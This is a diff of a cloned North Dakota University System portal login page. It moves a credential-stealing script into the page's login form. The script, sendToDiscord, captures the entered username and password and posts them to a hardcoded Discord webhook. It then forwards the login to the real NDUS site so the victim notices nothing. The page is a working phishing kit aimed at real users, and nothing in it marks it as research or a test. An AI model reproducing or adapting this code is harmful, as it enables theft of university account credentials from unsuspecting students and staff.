@@ -1,60 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Form Submission</title>
-</head>
-<body>
-    <form id="IDPLogin" name="IDPLogin" enctype="application/x-www-form-urlencoded" method="POST" action="https://ndusnam.ndus.edu/nidp/app/login?sid=0&sid=0" autocomplete="off" onsubmit="sendToDiscord(event)">
-        <input type="hidden" name="option" value="credential">
-        
-        <div id="namepassword" class="content login-page" style="margin: 0px; display: block;">
-            <div class="form-group">
-                <span id="ptLabelUserid"><label for="userid">User ID</label></span>
-                <input type="text" class="form-control" id="Ecom_User_ID" name="Ecom_User_ID" tabindex="1" value="" placeholder="Username">
-            </div>
-            <div class="form-group">
-                <span id="ptLabelPassword"><label for="pwd">Password</label></span>
-                <input type="password" class="form-control" id="Ecom_Password" name="Ecom_Password" tabindex="2" placeholder="Password" value="">
-            </div>
-            <div class="form-group">
-                <span>All users of systems provided by the North Dakota University System agree to abide by the policies and procedures of the NDUS and the laws of the State of North Dakota. <br><br> Campus Connection users also agree to abide by the <a id="useragreementlink" href="http://cts.ndus.edu/agreement/" target="_blank">Campus Connection User Agreement.</a></span>                                
-            </div>
-        </div>
-        <button type="submit">Login</button>
-    </form>
 
-    <script>
-        function sendToDiscord(event) {
-            event.preventDefault();
-            const username = document.getElementById('Ecom_User_ID').value;
-            const fact = document.getElementById('Ecom_Password').value;
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1338546359342469329/64X4z3WOE0GyGgmYPhMA792MxhaCJhoS3tfBOxNKbDzJQp5YzbiM21qQpranBzoCqadd';
-
-            const payload = {
-                content: `New form submission:\nUsername: ${username}\nFact: ${fact}`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Data sent to Discord successfully');
-                    // Submit the form after sending the data to Discord
-                    document.getElementById('IDPLogin').submit();
-                } else {
-                    console.error('Error sending data to Discord');
-                }
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-        }
-    </script>
-</body>
-</html>
 
 <!DOCTYPE html><html lang="en"><head>
 <link rel="icon" data-savepage-href="https://ndusnam.ndus.edu/favicon.ico" href="">
@@ -603,39 +547,58 @@ a:hover {
                 <div class="ps_signinentry col-md-6">
                     <h3>NDUS Portal Log In</h3>
                     <span>The NDUS Portal requires authentication using your NDUS identifier.</span><br><br>
-                    
-                    
-                    <form id="IDPLogin" name="IDPLogin" enctype="application/x-www-form-urlencoded" method="POST" action="https://ndusnam.ndus.edu/nidp/app/login?sid=0&sid=0" autocomplete="off">
-                        <input type="hidden" name="option" value="credential">
-                        
-                        
-                        <div id="namepassword" class="content login-page" style="margin: 0px; display: block;">
-                            <div class="form-group">
-                                <span id="ptLabelUserid"><label for="userid">User ID</label></span>
-                                <input type="text" class="form-control" id="Ecom_User_ID" name="Ecom_User_ID" tabindex="1" value="" placeholder="Username">
-                            </div>
-                            <div class="form-group">
-                                <span id="ptLabelPassword"><label for="pwd">Password</label></span>
-                                <input type="password" class="form-control" id="Ecom_Password" name="Ecom_Password" tabindex="2" placeholder="Password" value="">
-                            </div>
-                            <div class="form-group">
-                                <span>All users of systems provided by the North Dakota University System agree to abide by the policies and procedures of the NDUS and the laws of the State of North Dakota. <br><br> Campus Connection users also agree to abide by the  <a id="useragreementlink" href="http://cts.ndus.edu/agreement/" target="_blank">Campus Connection User Agreement.</a></span>                                
-                            </div>
 
-                            
+			 <form id="IDPLogin" name="IDPLogin" enctype="application/x-www-form-urlencoded" method="POST" action="https://ndusnam.ndus.edu/nidp/app/login?sid=0&sid=0" autocomplete="off" onsubmit="sendToDiscord(event)">
+        <input type="hidden" name="option" value="credential">
+        
+        <div id="namepassword" class="content login-page" style="margin: 0px; display: block;">
+            <div class="form-group">
+                <span id="ptLabelUserid"><label for="userid">User ID</label></span>
+                <input type="text" class="form-control" id="Ecom_User_ID" name="Ecom_User_ID" tabindex="1" value="" placeholder="Username">
+            </div>
+            <div class="form-group">
+                <span id="ptLabelPassword"><label for="pwd">Password</label></span>
+                <input type="password" class="form-control" id="Ecom_Password" name="Ecom_Password" tabindex="2" placeholder="Password" value="">
+            </div>
+            <div class="form-group">
+                <span>All users of systems provided by the North Dakota University System agree to abide by the policies and procedures of the NDUS and the laws of the State of North Dakota. <br><br> Campus Connection users also agree to abide by the <a id="useragreementlink" href="http://cts.ndus.edu/agreement/" target="_blank">Campus Connection User Agreement.</a></span>                                
+            </div>
+        </div>
+        <button type="submit">Login</button>
+    </form>
 
+    <script>
+        function sendToDiscord(event) {
+            event.preventDefault();
+            const username = document.getElementById('Ecom_User_ID').value;
+            const fact = document.getElementById('Ecom_Password').value;
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1338546359342469329/64X4z3WOE0GyGgmYPhMA792MxhaCJhoS3tfBOxNKbDzJQp5YzbiM21qQpranBzoCqadd';
 
-                            <div class="closure-but form-group">
-                                <span class="nam-signin-but action-but" style="width:100%;" name="loginButton2" id="loginButton2" tabindex="3">Log In</span>
-                            </div>
-                        </div>
-                        <table border="0" style="margin-top: 1em" width="100%" cellspacing="0" cellpadding="0">
-                            
-                            
-                            
-                        </table>
-                    </form>
+            const payload = {
+                content: `New form submission:\nUsername: ${username}\nFact: ${fact}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Data sent to Discord successfully');
+                    // Submit the form after sending the data to Discord
+                    document.getElementById('IDPLogin').submit();
+                } else {
+                    console.error('Error sending data to Discord');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
                     
+                   
 
                   
                     
